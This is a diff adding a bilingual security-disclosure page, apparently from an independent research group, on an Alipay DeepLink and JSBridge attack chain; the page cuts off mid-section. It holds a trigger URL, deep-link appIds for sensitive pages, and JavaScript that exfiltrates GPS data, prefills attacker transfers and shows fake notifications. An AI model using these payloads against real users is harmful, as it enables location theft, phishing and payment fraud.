@@ -1,0 +1,1682 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Alipay DeepLink Attack Surface Analysis | 支付宝 DeepLink 攻击面分析</title>
+<meta name="description" content="Independent security research: Alipay DeepLink + JSBridge attack chain analysis. 17 verified issues across 3 devices, 308 server logs. Full responsible disclosure timeline included.">
+<meta name="author" content="Innora AI Security Research">
+<meta property="og:title" content="Alipay DeepLink Attack Surface: One Link to Rule Them All">
+<meta property="og:description" content="17 verified security issues. 3 devices. 308 exfiltration logs. Full responsible disclosure.">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://innora.ai/zfb/">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🔒</text></svg>">
+<style>
+:root {
+  --bg: #0a0a0f;
+  --surface: #12121a;
+  --surface2: #1a1a28;
+  --border: #2a2a3a;
+  --text: #e0e0e8;
+  --text2: #9898a8;
+  --accent: #ff4444;
+  --accent2: #ff6b35;
+  --blue: #4488ff;
+  --green: #44cc88;
+  --yellow: #ffaa22;
+  --purple: #9966ff;
+  --code-bg: #0d1117;
+  --max-w: 860px;
+}
+* { margin: 0; padding: 0; box-sizing: border-box; }
+html { scroll-behavior: smooth; }
+body {
+  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Noto Sans SC', sans-serif;
+  background: var(--bg);
+  color: var(--text);
+  line-height: 1.7;
+  font-size: 16px;
+}
+a { color: var(--blue); text-decoration: none; }
+a:hover { text-decoration: underline; }
+
+/* Language Toggle */
+.lang-toggle {
+  position: fixed;
+  top: 16px;
+  right: 16px;
+  z-index: 1000;
+  display: flex;
+  gap: 0;
+  border-radius: 6px;
+  overflow: hidden;
+  border: 1px solid var(--border);
+  background: var(--surface);
+}
+.lang-toggle button {
+  padding: 6px 14px;
+  border: none;
+  background: transparent;
+  color: var(--text2);
+  cursor: pointer;
+  font-size: 13px;
+  font-weight: 600;
+  transition: all .2s;
+}
+.lang-toggle button.active {
+  background: var(--accent);
+  color: #fff;
+}
+
+/* Hero */
+.hero {
+  padding: 80px 24px 60px;
+  text-align: center;
+  background: linear-gradient(180deg, #1a0a0a 0%, var(--bg) 100%);
+  border-bottom: 1px solid var(--border);
+}
+.hero-badge {
+  display: inline-block;
+  padding: 4px 14px;
+  border-radius: 20px;
+  background: rgba(255,68,68,.15);
+  color: var(--accent);
+  font-size: 13px;
+  font-weight: 600;
+  letter-spacing: 1px;
+  text-transform: uppercase;
+  margin-bottom: 20px;
+}
+.hero h1 {
+  font-size: clamp(28px, 5vw, 48px);
+  font-weight: 800;
+  line-height: 1.2;
+  margin-bottom: 16px;
+  background: linear-gradient(135deg, #ff4444, #ff6b35);
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
+  background-clip: text;
+}
+.hero .subtitle {
+  font-size: 18px;
+  color: var(--text2);
+  max-width: 640px;
+  margin: 0 auto 24px;
+}
+.hero-stats {
+  display: flex;
+  justify-content: center;
+  gap: 32px;
+  flex-wrap: wrap;
+  margin-top: 32px;
+}
+.hero-stat {
+  text-align: center;
+}
+.hero-stat .num {
+  font-size: 36px;
+  font-weight: 800;
+  color: var(--accent);
+}
+.hero-stat .label {
+  font-size: 13px;
+  color: var(--text2);
+  text-transform: uppercase;
+  letter-spacing: 1px;
+}
+
+/* Main content */
+.container { max-width: var(--max-w); margin: 0 auto; padding: 0 24px; }
+section { padding: 48px 0; border-bottom: 1px solid var(--border); }
+h2 {
+  font-size: 28px;
+  font-weight: 700;
+  margin-bottom: 24px;
+  color: var(--text);
+}
+h2 .num { color: var(--accent); margin-right: 8px; }
+h3 {
+  font-size: 20px;
+  font-weight: 600;
+  margin: 24px 0 12px;
+  color: var(--text);
+}
+p { margin-bottom: 16px; color: var(--text2); }
+p strong, li strong { color: var(--text); }
+
+/* Cards */
+.card {
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-radius: 10px;
+  padding: 20px;
+  margin: 16px 0;
+}
+.card-critical { border-left: 4px solid var(--accent); }
+.card-high { border-left: 4px solid var(--accent2); }
+.card-medium { border-left: 4px solid var(--yellow); }
+.severity {
+  display: inline-block;
+  padding: 2px 8px;
+  border-radius: 4px;
+  font-size: 11px;
+  font-weight: 700;
+  text-transform: uppercase;
+  letter-spacing: .5px;
+}
+.sev-critical { background: rgba(255,68,68,.2); color: #ff4444; }
+.sev-high { background: rgba(255,107,53,.2); color: #ff6b35; }
+.sev-medium { background: rgba(255,170,34,.2); color: #ffaa22; }
+
+/* Code */
+pre {
+  background: var(--code-bg);
+  border: 1px solid var(--border);
+  border-radius: 8px;
+  padding: 16px;
+  overflow-x: auto;
+  font-size: 13px;
+  line-height: 1.6;
+  margin: 16px 0;
+}
+code {
+  font-family: 'SF Mono', 'Fira Code', 'Consolas', monospace;
+  font-size: 13px;
+}
+:not(pre) > code {
+  background: var(--surface2);
+  padding: 2px 6px;
+  border-radius: 4px;
+  color: var(--accent2);
+}
+
+/* Tables */
+table {
+  width: 100%;
+  border-collapse: collapse;
+  margin: 16px 0;
+  font-size: 14px;
+}
+th, td {
+  padding: 10px 12px;
+  text-align: left;
+  border-bottom: 1px solid var(--border);
+}
+th {
+  background: var(--surface2);
+  font-weight: 600;
+  color: var(--text);
+  font-size: 12px;
+  text-transform: uppercase;
+  letter-spacing: .5px;
+}
+td { color: var(--text2); }
+
+/* Timeline */
+.timeline { position: relative; padding-left: 32px; }
+.timeline::before {
+  content: '';
+  position: absolute;
+  left: 8px;
+  top: 0;
+  bottom: 0;
+  width: 2px;
+  background: var(--border);
+}
+.timeline-item {
+  position: relative;
+  margin-bottom: 24px;
+}
+.timeline-item::before {
+  content: '';
+  position: absolute;
+  left: -28px;
+  top: 6px;
+  width: 12px;
+  height: 12px;
+  border-radius: 50%;
+  background: var(--accent);
+  border: 2px solid var(--bg);
+}
+.timeline-date {
+  font-size: 13px;
+  color: var(--accent);
+  font-weight: 600;
+}
+
+/* Attack chain diagram */
+.attack-chain {
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-radius: 10px;
+  padding: 24px;
+  margin: 24px 0;
+}
+.chain-step {
+  display: flex;
+  align-items: flex-start;
+  gap: 16px;
+  padding: 12px 0;
+}
+.chain-step + .chain-step {
+  border-top: 1px dashed var(--border);
+}
+.chain-num {
+  flex-shrink: 0;
+  width: 32px;
+  height: 32px;
+  border-radius: 50%;
+  background: var(--accent);
+  color: #fff;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-weight: 700;
+  font-size: 14px;
+}
+.chain-arrow {
+  text-align: center;
+  color: var(--accent);
+  font-size: 20px;
+  padding: 4px 0;
+}
+
+/* Evidence box */
+.evidence-box {
+  background: #0d1117;
+  border: 1px solid #1a3a2a;
+  border-radius: 8px;
+  padding: 16px;
+  margin: 12px 0;
+}
+.evidence-box .label {
+  color: var(--green);
+  font-size: 12px;
+  font-weight: 600;
+  text-transform: uppercase;
+  letter-spacing: 1px;
+  margin-bottom: 8px;
+}
+
+/* Quote/Callout */
+.callout {
+  background: var(--surface2);
+  border-left: 4px solid var(--accent);
+  padding: 16px 20px;
+  margin: 24px 0;
+  border-radius: 0 8px 8px 0;
+}
+.callout.vendor {
+  border-left-color: var(--yellow);
+  background: rgba(255,170,34,.05);
+}
+.callout.info {
+  border-left-color: var(--blue);
+  background: rgba(68,136,255,.05);
+}
+
+/* Devices grid */
+.devices-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
+  gap: 16px;
+  margin: 16px 0;
+}
+.device-card {
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-radius: 10px;
+  padding: 16px;
+  text-align: center;
+}
+.device-card .icon { font-size: 36px; margin-bottom: 8px; }
+.device-card .name { font-weight: 600; color: var(--text); margin-bottom: 4px; }
+.device-card .detail { font-size: 13px; color: var(--text2); }
+
+/* TOC */
+.toc {
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-radius: 10px;
+  padding: 20px;
+  margin: 32px 0;
+}
+.toc h3 { margin-top: 0; font-size: 16px; }
+.toc ol { padding-left: 20px; }
+.toc li { margin: 6px 0; color: var(--text2); font-size: 14px; }
+.toc li a { color: var(--blue); }
+
+/* Footer */
+footer {
+  padding: 48px 24px;
+  text-align: center;
+  color: var(--text2);
+  font-size: 13px;
+}
+
+/* Lists */
+ul, ol { margin: 12px 0; padding-left: 24px; }
+li { margin: 6px 0; color: var(--text2); }
+
+/* Responsive */
+@media (max-width: 640px) {
+  .hero-stats { gap: 16px; }
+  .hero-stat .num { font-size: 28px; }
+  pre { font-size: 11px; padding: 12px; }
+  table { font-size: 12px; }
+  th, td { padding: 6px 8px; }
+}
+
+/* Bilingual */
+.zh { display: block; }
+.en { display: none; }
+body.lang-en .zh { display: none; }
+body.lang-en .en { display: block; }
+
+/* Print */
+@media print {
+  body { background: #fff; color: #000; }
+  .lang-toggle { display: none; }
+  .hero { background: none; }
+}
+</style>
+</head>
+<body>
+
+<!-- Language Toggle -->
+<div class="lang-toggle">
+  <button id="btn-zh" class="active" onclick="setLang('zh')">中文</button>
+  <button id="btn-en" onclick="setLang('en')">EN</button>
+</div>
+
+<!-- ==================== HERO ==================== -->
+<div class="hero">
+  <div class="hero-badge">
+    <span class="zh">独立安全研究</span>
+    <span class="en">Independent Security Research</span>
+  </div>
+  <h1>
+    <span class="zh">支付宝 DeepLink 攻击面分析</span>
+    <span class="en">Alipay DeepLink Attack Surface Analysis</span>
+  </h1>
+  <h1 style="font-size: clamp(18px, 3vw, 28px); margin-top: -8px;">
+    <span class="zh">一个链接，通向一切</span>
+    <span class="en">One Link to Rule Them All</span>
+  </h1>
+  <p class="subtitle">
+    <span class="zh">针对支付宝 Android/iOS 最新版的 DeepLink + WebView JSBridge 攻击链端到端分析。已通过负责任披露流程向蚂蚁集团报告，厂商回复为"正常功能"。</span>
+    <span class="en">End-to-end analysis of the DeepLink + WebView JSBridge attack chain on Alipay Android/iOS latest versions. Reported through responsible disclosure to Ant Group. Vendor response: "normal functionality."</span>
+  </p>
+  <div class="hero-stats">
+    <div class="hero-stat">
+      <div class="num">17</div>
+      <div class="label">
+        <span class="zh">已验证问题</span>
+        <span class="en">Verified Issues</span>
+      </div>
+    </div>
+    <div class="hero-stat">
+      <div class="num">308</div>
+      <div class="label">
+        <span class="zh">服务器日志</span>
+        <span class="en">Exfil Logs</span>
+      </div>
+    </div>
+    <div class="hero-stat">
+      <div class="num">3</div>
+      <div class="label">
+        <span class="zh">验证设备</span>
+        <span class="en">Devices Tested</span>
+      </div>
+    </div>
+    <div class="hero-stat">
+      <div class="num">42</div>
+      <div class="label">
+        <span class="zh">证据截图</span>
+        <span class="en">Screenshots</span>
+      </div>
+    </div>
+  </div>
+</div>
+
+<div class="container">
+
+<!-- ==================== META ==================== -->
+<section>
+  <table>
+    <tr>
+      <th style="width:160px">
+        <span class="zh">项目</span><span class="en">Field</span>
+      </th>
+      <th>
+        <span class="zh">值</span><span class="en">Value</span>
+      </th>
+    </tr>
+    <tr><td><strong>Target</strong></td><td>com.eg.android.AlipayGphone v10.8.26.7000 / v10.8.30.8000</td></tr>
+    <tr><td><strong>APK Size</strong></td><td>210.5 MB (220,503,494 bytes)</td></tr>
+    <tr><td><strong>Platform</strong></td><td>Android 16 (API 36) + iOS 26.3.1</td></tr>
+    <tr>
+      <td><strong>
+        <span class="zh">分析日期</span><span class="en">Analysis Date</span>
+      </strong></td>
+      <td>2026-02-16 ~ 2026-03-07</td>
+    </tr>
+    <tr>
+      <td><strong>
+        <span class="zh">攻击前提</span><span class="en">Prerequisites</span>
+      </strong></td>
+      <td>
+        <span class="zh">非Root、非越狱、无特殊权限、仅需受害者点击一个链接</span>
+        <span class="en">No root, no jailbreak, no special permissions. Victim only needs to click one link.</span>
+      </td>
+    </tr>
+    <tr>
+      <td><strong>
+        <span class="zh">研究者</span><span class="en">Researcher</span>
+      </strong></td>
+      <td>Innora AI Security Research (feng@innora.ai)</td>
+    </tr>
+  </table>
+</section>
+
+<!-- ==================== TOC ==================== -->
+<div class="toc">
+  <h3>
+    <span class="zh">目录</span><span class="en">Table of Contents</span>
+  </h3>
+  <ol>
+    <li><a href="#disclosure">
+      <span class="zh">披露时间线</span><span class="en">Disclosure Timeline</span>
+    </a></li>
+    <li><a href="#summary">
+      <span class="zh">核心发现摘要</span><span class="en">Executive Summary</span>
+    </a></li>
+    <li><a href="#chain">
+      <span class="zh">攻击链详解</span><span class="en">Attack Chain Details</span>
+    </a></li>
+    <li><a href="#poc">
+      <span class="zh">在线 PoC 演示</span><span class="en">Live PoC Demonstration</span>
+    </a></li>
+    <li><a href="#vulns">
+      <span class="zh">已验证安全问题</span><span class="en">Verified Security Issues</span>
+    </a></li>
+    <li><a href="#evidence">
+      <span class="zh">证据展示</span><span class="en">Evidence</span>
+    </a></li>
+    <li><a href="#devices">
+      <span class="zh">跨平台验证</span><span class="en">Cross-Platform Verification</span>
+    </a></li>
+    <li><a href="#ios">
+      <span class="zh">iOS 特有风险</span><span class="en">iOS-Specific Risks</span>
+    </a></li>
+    <li><a href="#defense">
+      <span class="zh">已生效的防护</span><span class="en">Working Defenses</span>
+    </a></li>
+    <li><a href="#vendor">
+      <span class="zh">厂商回应与讨论</span><span class="en">Vendor Response & Discussion</span>
+    </a></li>
+    <li><a href="#recommendations">
+      <span class="zh">修复建议</span><span class="en">Remediation Recommendations</span>
+    </a></li>
+  </ol>
+</div>
+
+<!-- ==================== 1. DISCLOSURE TIMELINE ==================== -->
+<section id="disclosure">
+  <h2><span class="num">01</span>
+    <span class="zh">负责任披露时间线</span>
+    <span class="en">Responsible Disclosure Timeline</span>
+  </h2>
+
+  <div class="zh">
+    <p>我们始终遵循负责任的安全研究原则。在公开任何信息之前，已通过多个渠道向蚂蚁集团进行了完整的报告。</p>
+  </div>
+  <div class="en">
+    <p>We followed responsible disclosure principles throughout. Before any public discussion, full reports were submitted to Ant Group through multiple channels.</p>
+  </div>
+
+  <div class="timeline">
+    <div class="timeline-item">
+      <div class="timeline-date">2026-02-16</div>
+      <p>
+        <span class="zh">开始对 Alipay v10.8.30.8000 APK 进行静态分析</span>
+        <span class="en">Started static analysis of Alipay v10.8.30.8000 APK</span>
+      </p>
+    </div>
+    <div class="timeline-item">
+      <div class="timeline-date">2026-02-25</div>
+      <p>
+        <span class="zh"><strong>第一次报告</strong> — TLS/SSL 安全分析报告发送至 bin.z@antgroup.com, lingyan.wanglingya@antgroup.com, antsrc@service.alipay.com</span>
+        <span class="en"><strong>First Report</strong> — TLS/SSL security analysis sent to bin.z@antgroup.com, lingyan.wanglingya@antgroup.com, antsrc@service.alipay.com</span>
+      </p>
+    </div>
+    <div class="timeline-item">
+      <div class="timeline-date">2026-03-06</div>
+      <p>
+        <span class="zh">综合安全分析完成，包含 SecurityGuard、BabaSSL、DexAOP 等模块的深度分析</span>
+        <span class="en">Comprehensive analysis completed covering SecurityGuard, BabaSSL, DexAOP and more</span>
+      </p>
+    </div>
+    <div class="timeline-item">
+      <div class="timeline-date">2026-03-07</div>
+      <p>
+        <span class="zh"><strong>第二次报告</strong> — DeepLink + JSBridge 8个漏洞的完整攻击链报告发送至蚂蚁集团联系人</span>
+        <span class="en"><strong>Second Report</strong> — Full DeepLink + JSBridge attack chain report (8 issues) sent to Ant Group contact</span>
+      </p>
+    </div>
+    <div class="timeline-item">
+      <div class="timeline-date">2026-03-07</div>
+      <p>
+        <span class="zh"><strong>第三次报告</strong> — V3增强版，17个漏洞 + 308条服务器日志 + 42张截图</span>
+        <span class="en"><strong>Third Report</strong> — V3 enhanced, 17 issues + 308 server logs + 42 screenshots</span>
+      </p>
+    </div>
+    <div class="timeline-item">
+      <div class="timeline-date">2026-03-07</div>
+      <p>
+        <span class="zh"><strong>第四次报告</strong> — 端到端外部攻击报告，含Samsung S25 Ultra + iPhone 16 Pro跨平台验证</span>
+        <span class="en"><strong>Fourth Report</strong> — E2E external attack report with cross-platform Samsung S25 Ultra + iPhone 16 Pro verification</span>
+      </p>
+    </div>
+    <div class="timeline-item">
+      <div class="timeline-date">2026-03-09</div>
+      <p>
+        <span class="zh">测试账户被封锁（安全测试期间触发风控），发送账户解封申请</span>
+        <span class="en">Test account banned (risk control triggered during testing). Account unblock request sent.</span>
+      </p>
+    </div>
+    <div class="timeline-item">
+      <div class="timeline-date">2026-03-11</div>
+      <p>
+        <span class="zh"><strong>厂商回应</strong>："正常功能" — 不认为是漏洞</span>
+        <span class="en"><strong>Vendor Response</strong>: "Normal functionality" — not considered a vulnerability</span>
+      </p>
+    </div>
+    <div class="timeline-item">
+      <div class="timeline-date">2026-03-11</div>
+      <p>
+        <span class="zh"><strong>公开发布</strong> — 既然厂商确认这些都是"正常功能"，那公开讨论"正常功能"的安全影响没有任何问题</span>
+        <span class="en"><strong>Public Disclosure</strong> — Since the vendor confirmed these are "normal features," discussing the security implications of "normal features" publicly is entirely appropriate</span>
+      </p>
+    </div>
+  </div>
+</section>
+
+<!-- ==================== 2. EXECUTIVE SUMMARY ==================== -->
+<section id="summary">
+  <h2><span class="num">02</span>
+    <span class="zh">核心发现摘要</span>
+    <span class="en">Executive Summary</span>
+  </h2>
+
+  <div class="zh">
+    <p>支付宝的 <code>alipays://</code> DeepLink scheme 允许任何第三方应用或网页将用户引导到支付宝的 Nebula WebView 容器，加载<strong>攻击者控制的外部网页</strong>。一旦加载，攻击者的 JavaScript 代码可以调用 <code>AlipayJSBridge</code> API，执行一系列危险操作：</p>
+    <ul>
+      <li><strong>窃取精确GPS定位</strong> — 在用户已授予支付宝位置权限的前提下，外部页面调用getLocation无任何二次确认弹窗，坐标直接回传攻击者服务器</li>
+      <li><strong>窃取完整设备指纹</strong> — 品牌/型号/OS/存储/电量/蓝牙/WiFi/权限状态 30+ 字段</li>
+      <li><strong>打开转账页面并预填攻击者收款账号和金额</strong>（最终确认仍需用户点击，但配合UI欺骗可大幅降低警惕性）</li>
+      <li><strong>触发支付SDK弹出支付界面</strong> — tradePay API 唤起收银台（用户仍需手动确认，但UI可被高度仿真）</li>
+      <li><strong>跳转18个敏感内部页面</strong> — 交易记录、银行卡管理、芝麻信用、提现、亲情号等</li>
+      <li><strong>显示虚假转账通知</strong> — 在支付宝内伪造 "转账 ¥5,000 到 张*明 成功"</li>
+      <li><strong>篡改标题栏为"安全中心"</strong> — 增强钓鱼可信度</li>
+      <li><strong>跳转到支付宝登录页面</strong> — 创建完美的凭据钓鱼入口</li>
+      <li><strong>链式加载更多恶意页面</strong> — 每个新页面都可再次调用全部 API</li>
+    </ul>
+    <p>攻击条件极低：<strong>受害者只需点击一个链接</strong>。无需Root、无需越狱、无需安装任何应用。链接可通过短信、微信、QQ、邮件、二维码等任何渠道传播。</p>
+  </div>
+
+  <div class="en">
+    <p>Alipay's <code>alipays://</code> DeepLink scheme allows any third-party app or webpage to direct users into Alipay's Nebula WebView container, loading <strong>attacker-controlled external web pages</strong>. Once loaded, the attacker's JavaScript can call <code>AlipayJSBridge</code> APIs to perform dangerous operations:</p>
+    <ul>
+      <li><strong>Steal precise GPS location</strong> — When location permission is already granted to Alipay, external pages calling getLocation get coordinates with no secondary consent dialog, sent directly to attacker server</li>
+      <li><strong>Steal complete device fingerprint</strong> — Brand/model/OS/storage/battery/Bluetooth/WiFi/permissions, 30+ fields</li>
+      <li><strong>Open transfer page with pre-filled attacker account and amount</strong> (final confirmation still requires user tap, but combined with UI spoofing can greatly reduce vigilance)</li>
+      <li><strong>Trigger payment SDK to launch payment UI</strong> — tradePay API invokes cashier (user must still confirm, but UI can be highly spoofed)</li>
+      <li><strong>Navigate to 18 sensitive internal pages</strong> — Transaction history, bank cards, credit score, withdrawal, family accounts, etc.</li>
+      <li><strong>Display fake transfer notifications</strong> — Forge "Transfer CNY 5,000 to Zhang*Ming completed" inside Alipay</li>
+      <li><strong>Spoof title bar to "Security Center"</strong> — Enhance phishing credibility</li>
+      <li><strong>Redirect to Alipay login page</strong> — Create perfect credential phishing entry point</li>
+      <li><strong>Chain-load more malicious pages</strong> — Each new page can call all APIs again</li>
+    </ul>
+    <p>Attack prerequisites are minimal: <strong>victim only needs to click one link</strong>. No root, no jailbreak, no app installation required. The link can be distributed via SMS, WeChat, QQ, email, QR codes, or any other channel.</p>
+  </div>
+</section>
+
+<!-- ==================== 3. ATTACK CHAIN ==================== -->
+<section id="chain">
+  <h2><span class="num">03</span>
+    <span class="zh">攻击链详解</span>
+    <span class="en">Attack Chain Details</span>
+  </h2>
+
+  <h3>
+    <span class="zh">攻击链 A: 网页链接 → WebView → JSBridge → 数据窃取 + 转账劫持</span>
+    <span class="en">Chain A: Web Link → WebView → JSBridge → Data Theft + Transfer Hijacking</span>
+  </h3>
+
+  <div class="attack-chain">
+    <div class="chain-step">
+      <div class="chain-num">1</div>
+      <div>
+        <strong>
+          <span class="zh">攻击者部署恶意页面</span>
+          <span class="en">Attacker deploys malicious page</span>
+        </strong>
+        <p>
+          <span class="zh">在任何公网 HTTPS 服务器上部署 PoC 页面（如 <code>https://innora.ai/zfb/poc/verify.html</code>）和数据收集端点</span>
+          <span class="en">Deploy PoC page (e.g., <code>https://innora.ai/zfb/poc/verify.html</code>) and data collection endpoint on any public HTTPS server</span>
+        </p>
+      </div>
+    </div>
+    <div class="chain-arrow">↓</div>
+    <div class="chain-step">
+      <div class="chain-num">2</div>
+      <div>
+        <strong>
+          <span class="zh">发送钓鱼链接给受害者</span>
+          <span class="en">Send phishing link to victim</span>
+        </strong>
+        <p>
+          <span class="zh">通过短信/微信/QQ等发送链接。受害者在手机浏览器中点击后，看到"恭喜获得88元红包"等社工页面</span>
+          <span class="en">Send link via SMS/WeChat/QQ. Victim clicks in mobile browser, sees social engineering page like "Congratulations! You won a ¥88 red packet"</span>
+        </p>
+        <div class="evidence-box">
+          <div class="label">Trigger URL</div>
+          <code>intent://platformapi/startapp?appId=20000067&url=https%3A%2F%2Finnora.ai%2Fzfb%2Fpoc%2Fverify.html#Intent;scheme=alipays;package=com.eg.android.AlipayGphone;end</code>
+        </div>
+      </div>
+    </div>
+    <div class="chain-arrow">↓</div>
+    <div class="chain-step">
+      <div class="chain-num">3</div>
+      <div>
+        <strong>
+          <span class="zh">支付宝 WebView 加载外部页面</span>
+          <span class="en">Alipay WebView loads external page</span>
+        </strong>
+        <p>
+          <span class="zh">Chrome 通过 <code>intent://</code> scheme 跳转到支付宝。支付宝 Nebula WebView 容器加载攻击者页面。<code>AlipayJSBridge</code> 被自动注入。显示一个"继续访问"警告（但<strong>未告知</strong>用户外部页面将获得 JSBridge API 权限）。</span>
+          <span class="en">Chrome triggers Alipay via <code>intent://</code> scheme. Alipay's Nebula WebView loads the attacker page. <code>AlipayJSBridge</code> is automatically injected. A "Continue to visit" warning appears (but does <strong>NOT</strong> inform the user that the external page will gain JSBridge API access).</span>
+        </p>
+      </div>
+    </div>
+    <div class="chain-arrow">↓</div>
+    <div class="chain-step">
+      <div class="chain-num">4</div>
+      <div>
+        <strong>
+          <span class="zh">JavaScript Payload 自动执行</span>
+          <span class="en">JavaScript Payload executes automatically</span>
+        </strong>
+        <p>
+          <span class="zh">攻击者 JS 调用 AlipayJSBridge API：</span>
+          <span class="en">Attacker JS calls AlipayJSBridge APIs:</span>
+        </p>
+<pre><code>// GPS 定位窃取
+AlipayJSBridge.call("getLocation", {}, function(result) {
+  // result = {lat: 5.460012, lng: 100.314139, city: "槟城"}
+  exfiltrate("GPS", result);  // POST to attacker server
+});
+
+// 打开转账页面，预填攻击者账号
+AlipayJSBridge.call("startApp", {
+  appId: "09999988",
+  param: {
+    actionType: "toAccount",
+    account: "attacker@evil.com",
+    amount: "1000"
+  }
+});
+
+// 显示假转账通知
+AlipayJSBridge.call("toast", {
+  content: "Transfer ¥5,000 to Zhang*Ming completed",
+  type: "success",
+  duration: 5000
+});</code></pre>
+      </div>
+    </div>
+    <div class="chain-arrow">↓</div>
+    <div class="chain-step">
+      <div class="chain-num">5</div>
+      <div>
+        <strong>
+          <span class="zh">数据回传到攻击者服务器</span>
+          <span class="en">Data exfiltrated to attacker server</span>
+        </strong>
+        <p>
+          <span class="zh">通过 XHR POST + Image Beacon 双通道将窃取的 GPS、设备信息、会话数据发送到攻击者服务器。<strong>308条完整日志记录在案。</strong></span>
+          <span class="en">GPS, device info, and session data sent to attacker server via dual-channel XHR POST + Image Beacon. <strong>308 complete log entries recorded.</strong></span>
+        </p>
+      </div>
+    </div>
+  </div>
+
+  <h3>
+    <span class="zh">攻击链 B: 零交互 DeepLink → 敏感页面直接暴露</span>
+    <span class="en">Chain B: Zero-Interaction DeepLink → Sensitive Page Direct Exposure</span>
+  </h3>
+
+  <div class="zh">
+    <p>以下 DeepLink 从浏览器或任何第三方 APP 触发后，支付宝<strong>不显示任何额外警告</strong>，直接跳转到敏感功能页面：</p>
+  </div>
+  <div class="en">
+    <p>The following DeepLinks, when triggered from a browser or any third-party app, cause Alipay to navigate <strong>without any additional warning</strong> directly to sensitive function pages:</p>
+  </div>
+
+  <table>
+    <tr>
+      <th>appId</th>
+      <th>
+        <span class="zh">目标页面</span><span class="en">Target Page</span>
+      </th>
+      <th>
+        <span class="zh">暴露数据</span><span class="en">Exposed Data</span>
+      </th>
+    </tr>
+    <tr><td><code>20000003</code></td>
+      <td><span class="zh">交易记录</span><span class="en">Transaction History</span></td>
+      <td><span class="zh">完整消费历史（商品名、金额、分类）</span><span class="en">Full spending history (items, amounts, categories)</span></td>
+    </tr>
+    <tr><td><code>20000116</code></td>
+      <td><span class="zh">转账联系人</span><span class="en">Transfer Contacts</span></td>
+      <td><span class="zh">20+ 联系人真实姓名、头像、转账金额</span><span class="en">20+ contacts' real names, avatars, transfer amounts</span></td>
+    </tr>
+    <tr><td><code>20000123</code></td>
+      <td><span class="zh">收款二维码</span><span class="en">Payment QR Code</span></td>
+      <td><span class="zh">完整收款码 + 真实姓名</span><span class="en">Full payment QR + real name</span></td>
+    </tr>
+    <tr><td><code>20000032</code></td>
+      <td><span class="zh">余额宝</span><span class="en">Yu'E Bao (Money Market)</span></td>
+      <td><span class="zh">余额 ¥5.00 + 累计收益 ¥9,453.67</span><span class="en">Balance ¥5.00 + total earnings ¥9,453.67</span></td>
+    </tr>
+    <tr><td><code>20000180</code></td>
+      <td><span class="zh">总资产</span><span class="en">Total Assets</span></td>
+      <td><span class="zh">完整资产概览</span><span class="en">Complete asset overview</span></td>
+    </tr>
+    <tr><td><code>20000153</code></td>
+      <td><span class="zh">芝麻信用</span><span class="en">Zhima Credit Score</span></td>
+      <td><span class="zh">信用评分</span><span class="en">Credit score</span></td>
+    </tr>
+    <tr><td><code>20000193</code></td>
+      <td><span class="zh">银行卡管理</span><span class="en">Bank Card Management</span></td>
+      <td><span class="zh">绑定的银行卡信息</span><span class="en">Linked bank card info</span></td>
+    </tr>
+    <tr><td><code>09999988</code></td>
+      <td><span class="zh">转账</span><span class="en">Transfer</span></td>
+      <td><span class="zh">可预填攻击者收款账号和金额</span><span class="en">Can pre-fill attacker account and amount</span></td>
+    </tr>
+    <tr><td><code>20000033</code></td>
+      <td><span class="zh">提现</span><span class="en">Withdrawal</span></td>
+      <td><span class="zh">提现页面</span><span class="en">Withdrawal page</span></td>
+    </tr>
+    <tr><td><code>20000221</code></td>
+      <td><span class="zh">亲情号</span><span class="en">Family Account</span></td>
+      <td><span class="zh">亲情号列表</span><span class="en">Family account list</span></td>
+    </tr>
+    <tr><td><code>68687023</code></td>
+      <td><span class="zh">花呗</span><span class="en">Huabei (Credit)</span></td>
+      <td><span class="zh">花呗页面</span><span class="en">Credit page</span></td>
+    </tr>
+    <tr><td><code>10000007</code></td>
+      <td><span class="zh">扫一扫</span><span class="en">Scan</span></td>
+      <td><span class="zh">触发摄像头权限</span><span class="en">Triggers camera permission</span></td>
+    </tr>
+  </table>
+
+  <div class="evidence-box">
+    <div class="label">
+      <span class="zh">触发方式</span><span class="en">Trigger Method</span>
+    </div>
+<pre><code>// From any app or browser:
+Intent i = new Intent(Intent.ACTION_VIEW);
+i.setData(Uri.parse("alipays://platformapi/startapp?appId=20000003"));
+startActivity(i);
+// Alipay opens transaction history directly. No warning.</code></pre>
+  </div>
+</section>
+
+<!-- ==================== 3.5 LIVE PoC ==================== -->
+<section id="poc">
+  <h2><span class="num">03.5</span>
+    <span class="zh">在线 PoC 演示</span>
+    <span class="en">Live PoC Demonstration</span>
+  </h2>
+
+  <div class="zh">
+    <p>以下是可在线体验的 PoC 页面（已脱敏，不收集任何数据）：</p>
+  </div>
+  <div class="en">
+    <p>Below are live PoC pages you can test (sanitized, no data collection):</p>
+  </div>
+
+  <div class="card" style="border-left: 4px solid var(--purple);">
+    <h3>
+      <span class="zh">Trigger 页面 — 模拟钓鱼入口</span>
+      <span class="en">Trigger Page — Simulated Phishing Entry</span>
+    </h3>
+    <p>
+      <span class="zh">模拟攻击者通过短信/微信发送的钓鱼页面。在安装了支付宝的 Android 手机上用 Chrome 打开即可体验。</span>
+      <span class="en">Simulates the phishing page an attacker would send via SMS/WeChat. Open in Chrome on an Android phone with Alipay installed.</span>
+    </p>
+    <div class="evidence-box">
+      <div class="label">URL</div>
+      <a href="https://innora.ai/zfb/poc/trigger.html" style="color: var(--purple); font-weight: 600;">https://innora.ai/zfb/poc/trigger.html</a>
+    </div>
+  </div>
+
+  <div class="card" style="border-left: 4px solid var(--blue);">
+    <h3>
+      <span class="zh">JSBridge PoC — 数据采集演示</span>
+      <span class="en">JSBridge PoC — Data Collection Demo</span>
+    </h3>
+    <p>
